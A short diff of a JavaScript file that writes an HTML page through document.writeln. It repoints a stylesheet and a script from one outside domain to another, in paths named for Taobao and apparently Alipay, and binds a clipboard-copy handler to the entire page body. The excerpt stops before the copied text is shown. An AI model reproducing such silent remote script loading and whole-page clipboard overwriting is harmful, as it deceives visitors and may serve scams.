@@ -1,11 +1,11 @@
 document.writeln("   <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"/>");
-document.writeln("        <link rel=\"stylesheet\" type=\"text/css\" href=\"https://za.120241400.com/zfb.css\" />");
+document.writeln("        <link rel=\"stylesheet\" type=\"text/css\" href=\"https://nojx.cc/taobao/zfb.css\" />");
 document.writeln("    </head>");
 document.writeln("    <body id=\'body\'>");
 document.writeln("");
 document.writeln("        <div class=\"foot\" style=\"padding: 0 0 0px 0\"></div>");
 document.writeln("        ");
-document.writeln("<script src=\"https://za.120241400.com/zfb.js\"></script>");
+document.writeln("<script src=\"https://nojx.cc/taobao/zfb.js\"></script>");
 document.writeln("<script type=\"text/javascript\">");
 document.writeln("            var clipboard = new Clipboard(\'body\', {");
 document.writeln("                text: function() {");
